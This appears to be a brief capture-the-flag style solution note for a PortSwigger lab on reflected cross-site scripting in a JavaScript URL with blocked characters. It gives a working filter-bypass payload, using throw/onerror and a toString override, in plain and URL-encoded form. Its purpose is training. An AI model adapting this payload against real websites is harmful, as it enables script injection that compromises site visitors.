# Reflected XSS in a JavaScript URL with some characters blocked

## This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent [XSS](https://portswigger.net/web-security/cross-site-scripting) attacks.

## To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.

### HINT:

`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

# `&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`

%27 = '
%2b = +
